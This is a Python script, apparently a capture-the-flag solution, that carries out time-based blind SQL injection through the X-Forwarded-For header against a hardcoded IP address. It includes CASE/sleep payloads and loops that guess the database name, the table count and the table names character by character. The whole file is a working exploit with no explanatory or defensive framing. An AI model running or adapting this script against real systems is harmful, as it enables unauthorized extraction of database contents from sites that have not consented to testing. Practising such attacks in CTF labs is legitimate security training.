import requests

char= '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_@.%&-'
url = 'http://123.206.87.240:8002/web15/'

payload_db_len = "1'+(select case when (length(database())='{0}') then sleep(6) else 1 end)+'1"
#猜解数据库名称的payload
payload_db = "1'+(select case when (substr(database() from {0} for 1)='{1}') then sleep(6) else 1 end)+'1"
#猜解表数量的payload
payload_tb_num = "1'+(select case when (select count(*) from information_schema.TABLES where TABLE_SCHEMA='{0}')='{1}' then sleep(6) else 1 end)+'1"
#猜解表名字长度的payload
payload_tb_name_len = "1'+(select case when (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='{0}' limit 1 offset {1}) = '{2}' then sleep(6) else 1 end)+'1"
#猜解表名字的payload
payload_tb_name = "1'+(select case when (substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='{0}' limit 1 offset {1}) from {2} for 1)) = '{3}' then sleep(6) else 1 end)+'1"


db_length = 0
def get_db_length():#数据库名长度
    global db_length
    for n in range(1,40):
        try:
            headers = {'x-forwarded-for': payload_db_len.format(n)}
            res = requests.get(url, headers=headers, timeout=5)
        except requests.exceptions.ReadTimeout:
            db_length = n
            break
    print("db_length:"+ str(db_length))

db_name = ''
def get_db_name():  # 数据库名破解
    global db_name
    for i in range(1, db_length +1):
        for j in char:
            try:
                headers = {'x-forwarded-for': payload_db.format(i,j)}
                res = requests.get(url, headers=headers, timeout=5)
            except requests.exceptions.ReadTimeout:
                # print(payload_db.format(i,j))
                db_name += j
                break
    print('db_name: ' + db_name)


table_num = 0
def get_data_num():#获取表的数量
    global table_num
    for i in range(1, 50):
        try:
            headers = {'x-forwarded-for': payload_tb_num.format(db_name, str(i))}
            res = requests.get(url, headers=headers, timeout=5)
        except requests.exceptions.ReadTimeout:
            table_num = i
            print('table_num: ' + str(i))
            break


def get_table_name():
    len = 0
    for i in range(table_num):
        for j in range(50):
            try:
                headers = {'x-forwarded-for': payload_tb_name_len.format(db_name, i, j)}
                res = requests.get(url, headers=headers, timeout=5)
            except requests.exceptions.ReadTimeout:
                len = j
                break
        print("No." + str(i + 1) + " table's length is: " + str(len))
        table_name = ''
        for k in range(1, len + 1):
            for j in char:
                try:
                    headers = {'x-forwarded-for': payload_tb_name.format(db_name, i, k, j)}
                    res = requests.get(url, headers=headers, timeout=5)
                except requests.exceptions.ReadTimeout:
                    # print(payload_tb_name.format(db_name,i,k,j))
                    table_name += j
                    break
        print(table_name)

get_db_length()
get_db_name()
get_data_num()
get_table_name()
